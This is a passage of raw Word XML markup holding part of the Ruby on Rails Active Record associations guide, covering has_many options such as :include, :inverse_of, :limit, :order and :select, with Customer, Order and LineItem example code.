          <w:p w14:paraId="3388CEC8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2271A055" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :line_items</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C208FE7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="083D8583" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B3797FB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LineItem &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5ECE4429" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :order</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A19B9C7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61159034" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you frequently retrieve line items directly from customers (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@customer.orders.line_items</w:t>
      </w:r>
      <w:r>
        <w:t>), then you can make your code somewhat more efficient by including line items in the association from customers to orders:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5544"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="0A7CD2FD" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="134A0C56" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AC7F2DF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :include</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :line_items</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03BD0E43" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06D8CB21" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45F55999" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="707B2DA7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40934F29" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :line_items</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E50BC85" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A5D3859" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="554775E3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LineItem &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31827137" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :order</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="743E0619" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="71B6E895" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11059092" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies the name of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association that is the inverse of this association. Does not work in combination with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5904"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="793E3BA5" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D87EF02" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02E8DB86" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :inverse_of</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A3A5535" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AE3AE91" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BACD920" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7112828E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer, :inverse_of</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E276AEF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="63832DA3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7ABA6E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you restrict the total number of objects that will be fetched through an association.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6384"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="728C6908" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="114EDD3D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="198A2762" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :recent_orders, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Order",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6415933F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "order_date DESC", :limit</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 100</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2ABEBE04" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0FA63FFC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F1658F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you specify the starting offset for fetching objects via an association. For example, if you set </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset =&gt; 11</w:t>
      </w:r>
      <w:r>
        <w:t>, it will skip the first 11 records.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D215F0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.15 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A05CBF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option dictates the order in which associated objects will be received (in the syntax used by an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ORDER BY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6504"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="51944720" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3312ECF2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7818DD6C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders, :order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "date_confirmed DESC"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CF36C72" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="40797E40" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.16 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:primary_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FED3F1C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By convention, Rails assumes that the column used to hold the primary key of the association is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can override this and explicitly specify the primary key with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:primary_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9AD131" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.17 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D580B3C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, then the associated objects will be read-only when retrieved via the association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B3CCBF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.18 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC28DF5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you override the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause that is used to retrieve data about the associated objects. By default, Rails retrieves all columns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCCD049" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you specify your own </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
      <w:r>
        <w:t>, be sure to include the primary key and foreign key columns of the associated model. If you do not, Rails will throw an error.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5F6A18" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.19 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7675F1EF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies the source association name for a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association. You only need to use this option if the name of the source association cannot be automatically inferred from the association name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CF4826" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.20 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source_type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0FAA0E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source_type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies the source association type for a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association that proceeds through a polymorphic association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFBA32B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.2.21 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13AF786C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
